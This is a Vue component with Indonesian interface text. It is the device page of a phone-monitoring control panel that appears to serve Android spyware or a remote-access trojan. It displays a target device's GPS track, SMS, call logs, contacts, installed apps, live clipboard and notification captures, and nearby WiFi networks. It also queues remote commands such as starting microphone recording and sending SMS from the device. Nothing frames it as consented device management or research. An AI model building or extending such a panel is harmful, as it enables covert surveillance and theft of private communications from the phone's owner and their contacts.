<template>
  <div class="device-page">
    <header class="device-header">
      <div class="header-content">
        <button @click="$router.push('/')" class="btn">← Kembali</button>
        <h1>Device: {{ deviceId }}</h1>
        <div class="device-status">
          <span :class="['status-dot', isOnline ? 'online' : 'offline']"></span>
          <span>{{ isOnline ? 'Online' : 'Offline' }}</span>
        </div>
      </div>
    </header>
    
    <main class="device-main">
      <div class="tabs">
        <button
          v-for="tab in tabs"
          :key="tab.id"
          @click="activeTab = tab.id"
          :class="['tab-btn', { active: activeTab === tab.id }]"
        >
          {{ tab.label }}
        </button>
      </div>
      
      <div class="tab-content">
        <!-- GPS Logging -->
        <div v-if="activeTab === 'gps'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">GPS Logging</h2>
              <button @click="loadGps" class="btn btn-primary">Refresh</button>
            </div>
            <div id="map" class="map-container"></div>
            <table class="table" style="margin-top: 20px;">
              <thead>
                <tr>
                  <th>Latitude</th>
                  <th>Longitude</th>
                  <th>Accuracy</th>
                  <th>Altitude</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="log in gpsLogs" :key="log.id">
                  <td>{{ log.latitude?.toFixed(6) }}</td>
                  <td>{{ log.longitude?.toFixed(6) }}</td>
                  <td>{{ log.accuracy }}m</td>
                  <td>{{ log.altitude }}m</td>
                  <td>{{ formatDate(log.timestamp) }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        
        <!-- SMS Logs -->
        <div v-if="activeTab === 'sms'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">SMS Logs</h2>
              <div>
                <input
                  v-model="smsNumber"
                  type="text"
                  class="input"
                  placeholder="Nomor telepon"
                  style="width: 200px; margin-right: 10px;"
                />
                <input
                  v-model="smsMessage"
                  type="text"
                  class="input"
                  placeholder="Pesan"
                  style="width: 300px; margin-right: 10px;"
                />
                <button @click="sendSms" class="btn btn-primary">Kirim SMS</button>
                <button @click="loadSms" class="btn" style="margin-left: 10px;">Refresh</button>
              </div>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>Phone Number</th>
                  <th>Message</th>
                  <th>Type</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="log in smsLogs" :key="log.id">
                  <td>{{ log.phone_number }}</td>
                  <td>{{ log.message }}</td>
                  <td>
                    <span :class="['badge', getSmsTypeClass(log.type)]">
                      {{ getSmsTypeLabel(log.type) }}
                    </span>
                  </td>
                  <td>{{ formatDate(log.timestamp) }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        
        <!-- Call Logs -->
        <div v-if="activeTab === 'calls'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">Call Logs</h2>
              <button @click="loadCalls" class="btn btn-primary">Refresh</button>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>Phone Number</th>
                  <th>Type</th>
                  <th>Duration</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="log in callLogs" :key="log.id">
                  <td>{{ log.phone_number }}</td>
                  <td><span :class="['badge', getCallTypeBadge(log.call_type)]">{{ log.call_type }}</span></td>
                  <td>{{ formatDuration(log.duration) }}</td>
                  <td>{{ formatDate(log.timestamp) }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        
        <!-- Contacts -->
        <div v-if="activeTab === 'contacts'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">Contacts ({{ contacts.length }})</h2>
              <button @click="loadContacts" class="btn btn-primary">Refresh</button>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>Name</th>
                  <th>Phone Number</th>
                  <th>Email</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="contact in contacts" :key="contact.id">
                  <td>{{ contact.name }}</td>
                  <td>{{ contact.phone_number }}</td>
                  <td>{{ contact.email || '-' }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        
        <!-- Installed Apps -->
        <div v-if="activeTab === 'apps'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">Installed Apps ({{ apps.length }})</h2>
              <button @click="loadApps" class="btn btn-primary">Refresh</button>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>App Name</th>
                  <th>Package Name</th>
                  <th>Version</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="app in apps" :key="app.id">
                  <td>{{ app.app_name }}</td>
                  <td><code>{{ app.package_name }}</code></td>
                  <td>{{ app.version }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        
        <!-- Clipboard -->
        <div v-if="activeTab === 'clipboard'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">Live Clipboard Logging</h2>
              <button @click="loadClipboard" class="btn btn-primary">Refresh</button>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>Content</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="log in clipboardLogs" :key="log.id">
                  <td><code style="word-break: break-all;">{{ log.content }}</code></td>
                  <td>{{ formatDate(log.timestamp) }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        
        <!-- Notifications -->
        <div v-if="activeTab === 'notifications'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">Live Notification Logging</h2>
              <button @click="loadNotifications" class="btn btn-primary">Refresh</button>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>App</th>
                  <th>Title</th>
                  <th>Content</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="log in notifications" :key="log.id">
                  <td><span class="badge badge-info">{{ log.app_name }}</span></td>
                  <td>{{ log.title }}</td>
                  <td>{{ log.content }}</td>
                  <td>{{ formatDate(log.timestamp) }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        
        <!-- WiFi Networks -->
        <div v-if="activeTab === 'wifi'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">WiFi Networks ({{ wifiNetworks.length }})</h2>
              <button @click="loadWifi" class="btn btn-primary">Refresh</button>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>SSID</th>
                  <th>BSSID</th>
                  <th>Capabilities</th>
                  <th>Frequency</th>
                  <th>Signal Level</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="network in wifiNetworks" :key="network.id">
                  <td>{{ network.ssid }}</td>
                  <td><code>{{ network.bssid }}</code></td>
                  <td>{{ network.capabilities }}</td>
                  <td>{{ network.frequency }} MHz</td>
                  <td>{{ network.level }} dBm</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        
        <!-- Commands -->
        <div v-if="activeTab === 'commands'" class="tab-panel">
          <div class="card">
            <div class="card-header">
              <h2 class="card-title">Command Queuing</h2>
              <button @click="loadCommands" class="btn btn-primary">Refresh</button>
            </div>
            <div style="margin-bottom: 20px;">
              <select v-model="selectedCommand" class="input" style="width: 200px; margin-right: 10px;">
                <option value="">Pilih Command</option>
                <option value="start_gps">Start GPS Logging</option>
                <option value="stop_gps">Stop GPS Logging</option>
                <option value="start_mic">Start Microphone Recording</option>
                <option value="stop_mic">Stop Microphone Recording</option>
                <option value="get_contacts">Get Contacts</option>
                <option value="get_apps">Get Installed Apps</option>
                <option value="get_wifi">Get WiFi Networks</option>
                <option value="get_clipboard">Get Clipboard</option>
              </select>
              <button @click="sendCommand" class="btn btn-primary">Kirim Command</button>
            </div>
            <table class="table">
              <thead>
                <tr>
                  <th>Command</th>
                  <th>Parameters</th>
                  <th>Status</th>
                  <th>Result</th>
                  <th>Created At</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="cmd in commands" :key="cmd.id">
                  <td><code>{{ cmd.command }}</code></td>
                  <td>{{ cmd.parameters || '-' }}</td>
                  <td><span :class="['badge', getCommandStatusBadge(cmd.status)]">{{ cmd.status }}</span></td>
                  <td><code style="word-break: break-all;">{{ cmd.result || '-' }}</code></td>
                  <td>{{ formatDate(cmd.created_at) }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </main>
  </div>
</template>

<script>
import axios from 'axios';
import io from 'socket.io-client';
import L from 'leaflet';

export default {
  name: 'Device',
  data() {
    return {
      deviceId: '',
      isOnline: false,
      activeTab: 'gps',
      tabs: [
        { id: 'gps', label: '📍 GPS' },
        { id: 'sms', label: '💬 SMS' },
        { id: 'calls', label: '📞 Calls' },
        { id: 'contacts', label: '👥 Contacts' },
        { id: 'apps', label: '📱 Apps' },
        { id: 'clipboard', label: '📋 Clipboard' },
        { id: 'notifications', label: '🔔 Notifications' },
        { id: 'wifi', label: '📶 WiFi' },
        { id: 'commands', label: '⚙️ Commands' }
      ],
      gpsLogs: [],
      smsLogs: [],
      callLogs: [],
      contacts: [],
      apps: [],
      clipboardLogs: [],
      notifications: [],
      wifiNetworks: [],
      commands: [],
      smsNumber: '',
      smsMessage: '',
      selectedCommand: '',
      map: null,
      socket: null
    };
  },
  mounted() {
    this.deviceId = this.$route.params.deviceId;
    this.connectSocket();
    this.loadAllData();
    this.$nextTick(() => {
      this.initMap();
    });
  },
  beforeUnmount() {
    if (this.map) {
      this.map.remove();
    }
    if (this.socket) {
      this.socket.disconnect();
    }
  },
  methods: {
    connectSocket() {
      this.socket = io();
      
      this.socket.on('connect', () => {
        console.log('Connected to server');
      });
      
      this.socket.on('gps_update', (data) => {
        if (data.deviceId === this.deviceId) {
          this.gpsLogs.unshift(data);
          this.updateMap(data);
        }
      });
      
      this.socket.on('sms_update', (data) => {
        if (data.deviceId === this.deviceId) {
          this.smsLogs.unshift(data);
        }
      });
      
      this.socket.on('call_update', (data) => {
        if (data.deviceId === this.deviceId) {
          this.callLogs.unshift(data);
        }
      });
      
      this.socket.on('clipboard_update', (data) => {
        if (data.deviceId === this.deviceId) {
          this.clipboardLogs.unshift(data);
        }
      });
      
      this.socket.on('notification_update', (data) => {
        if (data.deviceId === this.deviceId) {
          this.notifications.unshift(data);
        }
      });
      
      // Listen for device status updates
      this.socket.on('device_update', (data) => {
        if (data.deviceId === this.deviceId) {
          this.isOnline = data.status === 'online';
        }
      });
    },
    initMap() {
      if (this.map) return;
      
      this.map = L.map('map').setView([-6.2088, 106.8456], 13);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
      }).addTo(this.map);
      
      if (this.gpsLogs.length > 0) {
        this.gpsLogs.forEach(log => {
          if (log.latitude && log.longitude) {
            L.marker([log.latitude, log.longitude])
              .addTo(this.map)
              .bindPopup(`Accuracy: ${log.accuracy}m`);
          }
        });
      }
    },
    updateMap(data) {
      if (this.map && data.latitude && data.longitude) {
        L.marker([data.latitude, data.longitude])
          .addTo(this.map)
          .bindPopup(`Accuracy: ${data.accuracy}m`);
        this.map.setView([data.latitude, data.longitude], 15);
      }
    },
    async loadAllData() {
      await Promise.all([
        this.loadDeviceInfo(),
        this.loadGps(),
        this.loadSms(),
        this.loadCalls(),
        this.loadContacts(),
        this.loadApps(),
        this.loadClipboard(),
        this.loadNotifications(),
        this.loadWifi(),
        this.loadCommands()
      ]);
    },
    async loadDeviceInfo() {
      try {
        const response = await axios.get('/api/devices');
        const device = response.data.find(d => d.device_id === this.deviceId);
        if (device) {
          this.isOnline = this.getDeviceStatus(device) === 'online';
        }
      } catch (error) {
        console.error('Error loading device info:', error);
      }
    },
    getDeviceStatus(device) {
      if (device.status === 'online') {
        return 'online';
      }
      if (device.last_seen) {
        const lastSeen = new Date(device.last_seen);
        const now = new Date();
        const diffMinutes = (now - lastSeen) / (1000 * 60);
        return diffMinutes < 2 ? 'online' : 'offline';
      }
      return 'offline';
    },
    async loadGps() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/gps`);
        this.gpsLogs = response.data;
        this.$nextTick(() => {
          if (this.map && this.gpsLogs.length > 0) {
            this.map.eachLayer((layer) => {
              if (layer instanceof L.Marker) {
                this.map.removeLayer(layer);
              }
            });
            this.gpsLogs.forEach(log => {
              if (log.latitude && log.longitude) {
                L.marker([log.latitude, log.longitude])
                  .addTo(this.map)
                  .bindPopup(`Accuracy: ${log.accuracy}m`);
              }
            });
            if (this.gpsLogs[0]) {
              this.map.setView([this.gpsLogs[0].latitude, this.gpsLogs[0].longitude], 13);
            }
          }
        });
      } catch (error) {
        console.error('Error loading GPS:', error);
      }
    },
    async loadSms() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/sms`);
        this.smsLogs = response.data;
      } catch (error) {
        console.error('Error loading SMS:', error);
      }
    },
    async loadCalls() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/calls`);
        this.callLogs = response.data;
      } catch (error) {
        console.error('Error loading calls:', error);
      }
    },
    async loadContacts() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/contacts`);
        this.contacts = response.data;
      } catch (error) {
        console.error('Error loading contacts:', error);
      }
    },
    async loadApps() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/apps`);
        this.apps = response.data;
      } catch (error) {
        console.error('Error loading apps:', error);
      }
    },
    async loadClipboard() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/clipboard`);
        this.clipboardLogs = response.data;
      } catch (error) {
        console.error('Error loading clipboard:', error);
      }
    },
    async loadNotifications() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/notifications`);
        this.notifications = response.data;
      } catch (error) {
        console.error('Error loading notifications:', error);
      }
    },
    async loadWifi() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/wifi`);
        this.wifiNetworks = response.data;
      } catch (error) {
        console.error('Error loading WiFi:', error);
      }
    },
    async loadCommands() {
      try {
        const response = await axios.get(`/api/devices/${this.deviceId}/commands`);
        this.commands = response.data;
      } catch (error) {
        console.error('Error loading commands:', error);
      }
    },
    async sendSms() {
      if (!this.smsNumber || !this.smsMessage) {
        alert('Mohon isi nomor dan pesan');
        return;
      }
      
      try {
        await axios.post(`/api/devices/${this.deviceId}/commands`, {
          command: 'send_sms',
          parameters: {
            phoneNumber: this.smsNumber,
            message: this.smsMessage
          }
        });
        this.smsNumber = '';
        this.smsMessage = '';
        alert('Command SMS dikirim');
        this.loadCommands();
      } catch (error) {
        console.error('Error sending SMS command:', error);
        alert('Gagal mengirim command');
      }
    },
    async sendCommand() {
      if (!this.selectedCommand) {
        alert('Pilih command terlebih dahulu');
        return;
      }
      
      try {
        await axios.post(`/api/devices/${this.deviceId}/commands`, {
          command: this.selectedCommand,
          parameters: {}
        });
        this.selectedCommand = '';
        alert('Command dikirim');
        this.loadCommands();
      } catch (error) {
        console.error('Error sending command:', error);
        alert('Gagal mengirim command');
      }
    },
    formatDate(dateString) {
      if (!dateString) return '-';
      const date = new Date(dateString);
      return date.toLocaleString('id-ID');
    },
    formatDuration(seconds) {
      if (!seconds) return '0s';
      const mins = Math.floor(seconds / 60);
      const secs = seconds % 60;
      return mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
    },
    getSmsTypeLabel(type) {
      const labels = {
        'inbox': '📥 Diterima',
        'sent': '📤 Dikirim',
        'draft': '📝 Draft',
        'outbox': '📮 Outbox',
        'failed': '❌ Gagal',
        'queued': '⏳ Antrian',
        'unknown': '❓ Unknown'
      };
      return labels[type] || type;
    },
    getSmsTypeClass(type) {
      const classes = {
        'inbox': 'badge-success',
        'sent': 'badge-info',
        'draft': 'badge-warning',
        'outbox': 'badge-warning',
        'failed': 'badge-danger',
        'queued': 'badge-secondary',
        'unknown': 'badge-secondary'
      };
      return classes[type] || 'badge-secondary';
    },
    getCallTypeBadge(type) {
      if (type === 'incoming') return 'badge-success';
      if (type === 'outgoing') return 'badge-info';
      return 'badge-warning';
    },
    getCommandStatusBadge(status) {
      if (status === 'completed') return 'badge-success';
      if (status === 'failed') return 'badge-danger';
      return 'badge-warning';
    }
  }
};
</script>

<style scoped>
.device-page {
  min-height: 100vh;
  position: relative;
  background: #000000;
  overflow-x: hidden;
}

/* Animated Grid Background */
.device-page::before {
  content: '';
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-image: 
    linear-gradient(rgba(74, 158, 255, 0.08) 1px, transparent 1px),
    linear-gradient(90deg, rgba(74, 158, 255, 0.08) 1px, transparent 1px);
  background-size: 50px 50px;
  animation: gridMove 20s linear infinite;
  z-index: 0;
  pointer-events: none;
}

@keyframes gridMove {
  0% {
    transform: translate(0, 0);
  }
  100% {
    transform: translate(50px, 50px);
  }
}

/* Scan Line Effect */
.device-page::after {
  content: '';
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 2px;
  background: linear-gradient(90deg, 
    transparent 0%, 
    rgba(74, 158, 255, 0.3) 50%, 
    transparent 100%);
  animation: scanLine 4s linear infinite;
  z-index: 1;
  box-shadow: 0 0 10px rgba(74, 158, 255, 0.3);
  pointer-events: none;
}

@keyframes scanLine {
  0% {
    top: 0;
    opacity: 1;
  }
  100% {
    top: 100%;
    opacity: 0;
  }
}

/* Glitch Effect Background */
.device-page {
  background: 
    radial-gradient(circle at 20% 50%, rgba(74, 158, 255, 0.08) 0%, transparent 50%),
    radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.08) 0%, transparent 50%),
    radial-gradient(circle at 40% 20%, rgba(16, 185, 129, 0.04) 0%, transparent 50%),
    linear-gradient(135deg, #000000 0%, #0a0a0a 25%, #000000 50%, #0a0a0a 75%, #000000 100%);
  background-size: 100% 100%, 100% 100%, 100% 100%, 200% 200%;
  animation: backgroundShift 20s ease infinite;
}

@keyframes backgroundShift {
  0%, 100% {
    background-position: 0% 0%, 0% 0%, 0% 0%, 0% 0%;
  }
  50% {
    background-position: 100% 100%, 100% 100%, 100% 100%, 100% 100%;
  }
}

.device-header {
  background: rgba(26, 26, 26, 0.95);
  border-bottom: 1px solid rgba(74, 158, 255, 0.3);
  padding: 20px;
  position: sticky;
  top: 0;
  z-index: 100;
  backdrop-filter: blur(10px);
  box-shadow: 
    0 4px 20px rgba(0, 0, 0, 0.5),
    0 0 20px rgba(74, 158, 255, 0.1);
}

.header-content {
  max-width: 1400px;
  margin: 0 auto;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.device-header h1 {
  font-size: 24px;
  font-weight: 700;
  background: linear-gradient(135deg, #4a9eff 0%, #8b5cf6 50%, #4a9eff 100%);
  background-size: 200% 200%;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  animation: titleShine 3s ease infinite;
  letter-spacing: 1px;
  text-shadow: 0 0 20px rgba(74, 158, 255, 0.3);
}

@keyframes titleShine {
  0%, 100% {
    background-position: 0% 50%;
  }
  50% {
    background-position: 100% 50%;
  }
}

.device-status {
  display: flex;
  align-items: center;
  gap: 8px;
}

.status-dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: #888;
}

.status-dot.online {
  background: #4caf50;
  box-shadow: 0 0 10px #4caf50;
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0%, 100% {
    opacity: 1;
    transform: scale(1);
  }
  50% {
    opacity: 0.7;
    transform: scale(1.1);
  }
}

.status-dot.offline {
  background: #f44336;
}

.device-main {
  max-width: 1400px;
  margin: 0 auto;
  padding: 30px 20px;
  position: relative;
  z-index: 10;
}

.tabs {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
  border-bottom: 1px solid rgba(74, 158, 255, 0.2);
  padding-bottom: 10px;
  position: relative;
  z-index: 10;
}

.tab-btn {
  padding: 10px 20px;
  background: transparent;
  border: none;
  color: #888;
  cursor: pointer;
  font-size: 14px;
  border-bottom: 2px solid transparent;
  transition: all 0.3s;
  position: relative;
}

.tab-btn::before {
  content: '';
  position: absolute;
  bottom: -2px;
  left: 0;
  width: 0;
  height: 2px;
  background: linear-gradient(90deg, #4a9eff, #8b5cf6);
  transition: width 0.3s;
}

.tab-btn:hover {
  color: #fff;
}

.tab-btn:hover::before {
  width: 100%;
}

.tab-btn.active {
  color: #4a9eff;
  border-bottom-color: #4a9eff;
}

.tab-btn.active::before {
  width: 100%;
  background: linear-gradient(90deg, #4a9eff, #8b5cf6);
  box-shadow: 0 0 10px rgba(74, 158, 255, 0.5);
}

.tab-content {
  margin-top: 20px;
  position: relative;
  z-index: 10;
}

.tab-content .card {
  background: rgba(26, 26, 26, 0.9);
  border: 1px solid rgba(74, 158, 255, 0.2);
  backdrop-filter: blur(5px);
  box-shadow: 
    0 4px 20px rgba(0, 0, 0, 0.3),
    0 0 10px rgba(74, 158, 255, 0.1);
  transition: all 0.3s;
}

.tab-content .card:hover {
  border-color: rgba(74, 158, 255, 0.4);
  box-shadow: 
    0 6px 30px rgba(0, 0, 0, 0.4),
    0 0 20px rgba(74, 158, 255, 0.2);
}

.tab-content .card-header {
  border-bottom-color: rgba(74, 158, 255, 0.2);
}

.tab-content .card-title {
  background: linear-gradient(135deg, #4a9eff 0%, #8b5cf6 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

.tab-content .table th {
  background: rgba(42, 42, 42, 0.8);
  border-bottom: 1px solid rgba(74, 158, 255, 0.2);
  color: #fff;
}

.tab-content .table td {
  border-bottom: 1px solid rgba(42, 42, 42, 0.5);
}

.tab-content .table tr:hover {
  background: rgba(74, 158, 255, 0.05);
}

.map-container {
  height: 500px;
  width: 100%;
  border-radius: 8px;
  overflow: hidden;
  margin-bottom: 20px;
  border: 1px solid rgba(74, 158, 255, 0.2);
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}

.badge {
  display: inline-block;
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
}

.badge-success {
  background: #10b981;
  color: #fff;
}

.badge-info {
  background: #3b82f6;
  color: #fff;
}

.badge-warning {
  background: #f59e0b;
  color: #fff;
}

.badge-danger {
  background: #ef4444;
  color: #fff;
}

.badge-secondary {
  background: #6b7280;
  color: #fff;
}

code {
  background: #2a2a2a;
  padding: 2px 6px;
  border-radius: 4px;
  font-family: 'Courier New', monospace;
  font-size: 12px;
}

@media (max-width: 768px) {
  .tabs {
    flex-direction: column;
  }
  
  .header-content {
    flex-direction: column;
    gap: 15px;
  }
}
</style>

